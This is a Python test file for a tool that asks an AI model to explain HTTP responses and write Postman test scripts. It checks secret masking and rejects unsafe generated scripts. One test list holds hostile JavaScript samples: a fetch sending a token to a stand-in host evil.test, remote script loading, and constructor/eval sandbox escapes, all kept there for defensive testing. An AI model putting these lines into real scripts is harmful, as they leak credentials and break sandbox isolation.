"""Explaining a response and writing its tests: what the model sees, what may come back."""

from __future__ import annotations

import asyncio
import json

import pytest

from src.application.config.config import settings
from src.application.exceptions.exceptions import BadGatewayError
from src.application.usecases import ai_http_usecase
from src.application.usecases.ai_http_usecase import AiHttpUseCase, MASK, mask_body, mask_headers, mask_url
from src.application.usecases.ai_usecase import AiUseCase
from src.domain.models.ai_domain import AiCaller
from tests.support.fake_ai import FakeModel, FakeStore

ADMIN = AiCaller(ip="1.2.3.4", admin=True)
JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
REQUEST = {"method": "post", "url": "https://u:p@api.test/v1/login?api_key=K123&page=2",
           "headers": [["Authorization", "Bearer " + JWT], ["Content-Type", "application/json"]],
           "body": json.dumps({"user": "an", "password": "hunter2"})}
RESPONSE = {"status": 200, "statusText": "OK", "contentType": "application/json", "timeMs": 182.4, "sizeBytes": 80,
            "headers": [["Set-Cookie", "sid=abc"], ["Content-Type", "application/json"], ["X-RateLimit-Remaining", "9"]],
            "body": json.dumps({"access_token": JWT, "user": {"id": 7, "name": "An", "location": "HN"}})}
SCRIPT = ("const body = pm.response.json();\n"
          "pm.test('Trạng thái 200', function () { pm.response.to.have.status(200); });\n"
          "pm.test('Có người dùng', function () { pm.expect(body.user).to.have.property('location'); "
          "pm.expect(body.user.location).to.be.a('string'); });")


@pytest.fixture
def http(monkeypatch):
    monkeypatch.setattr(settings, "GEMINI_URL", "https://gemini.test/v1beta/models/gemini-2.5-flash:generateContent")
    monkeypatch.setattr(settings, "GEMINI_API_KEY", "k")
    monkeypatch.setattr(settings, "AI_ENABLED", True)
    monkeypatch.setattr(settings, "AI_ACCESS", "admin")

    def make(answer):
        store, model = FakeStore(), FakeModel([json.dumps(answer)])
        return AiHttpUseCase(AiUseCase(store, model)), store, model
    return make


def test_secrets_are_masked_before_the_model_sees_anything(http):
    uc, store, model = http({"summary": "Đăng nhập thành công.", "details": ["Có token"], "problems": [], "next": []})
    out = asyncio.run(uc.explain(ADMIN, request=REQUEST, response=RESPONSE))
    prompt = model.calls[0]["contents"][0]["parts"][0]["text"]
    for secret in ("hunter2", "K123", "sid=abc", JWT, "u:p@"):
        assert secret not in prompt
    assert "POST https://api.test/v1/login?api_key=" in prompt and "page=2" in prompt
    assert "X-RateLimit-Remaining: 9" in prompt and '"location": "HN"' in prompt
    assert out == {"summary": "Đăng nhập thành công.", "details": ["Có token"], "problems": [], "next": [],
                   "cached": False}
    assert store.records[0][0] == "http_explain"


def test_masking_helpers():
    assert mask_headers([["Authorization", "x"], ["X-Api-Key", "y"], ["Accept", "a/b"]]) == [
        ["Authorization", MASK], ["X-Api-Key", MASK], ["Accept", "a/b"]]
    assert mask_url("https://h.test/p?q=1") == "https://h.test/p?q=1"
    assert mask_url("https://h.test/p?access_token=s3cr3t&q=a%20b") == f"https://h.test/p?access_token={MASK}&q=a b"
    assert "s3cr3t" not in mask_body("password=s3cr3t&user=an", 1000) and "user=an" in mask_body("user=an", 100)
    cut = mask_body("x" * 50, 10)
    assert cut.startswith("x" * 10) and "còn 40 ký tự" in cut


def test_a_test_script_comes_back_as_written(http):
    uc, store, model = http({"script": "```js\n" + SCRIPT + "\n```", "notes": "Giả định body là JSON."})
    out = asyncio.run(uc.tests(ADMIN, request=REQUEST, response=RESPONSE))
    assert out["script"] == SCRIPT and out["notes"] == "Giả định body là JSON." and store.records[0][0] == "http_tests"
    assert "pm.response.to.have.status(200)" in model.calls[0]["contents"][0]["parts"][0]["text"]
    assert model.calls[0]["config"]["responseSchema"] == ai_http_usecase.TESTS_SCHEMA


@pytest.mark.parametrize("bad", [
    "fetch('https://evil.test/?d=' + pm.environment.get('token'))",
    "var g = (function () { return this; })(); g.fetch('x');",
    "[]['constructor']['constructor']('return fetch')()",
    "pm.test.constructor('return 1')()",
    "var k = []['con' + 'structor'];",
    "pm['\\u0063onstructor']",
    "setTimeout(function () {}, 1)",
    "globalThis.postMessage(1)",
    "new Function('return 1')",
    "importScripts('https://evil.test/x.js')",
    "(0, eval)('1')",
])
def test_a_script_that_reaches_outside_the_sandbox_is_refused(http, bad):
    uc, _, _ = http({"script": "pm.test('x', function () {});\n" + bad})
    with pytest.raises(BadGatewayError):
        asyncio.run(uc.tests(ADMIN, request=REQUEST, response=RESPONSE))


@pytest.mark.parametrize("fine", [
    "pm.expect(body.location).to.equal('HN');",
    "pm.expect(body).to.have.property('document');",
    "pm.expect(pm.response.headers.get('Content-Type')).to.include('json');",
    "pm.expect(`a${1}`).to.equal('a1');",
])
def test_ordinary_scripts_pass(http, fine):
    uc, _, _ = http({"script": "const body = pm.response.json();\npm.test('ổn', function () { " + fine + " });"})
    assert fine in asyncio.run(uc.tests(ADMIN, request=REQUEST, response=RESPONSE))["script"]


def test_an_answer_without_tests_is_refused(http):
    uc, _, _ = http({"script": "console.log(1)"})
    with pytest.raises(BadGatewayError):
        asyncio.run(uc.tests(ADMIN, request=REQUEST, response=RESPONSE))
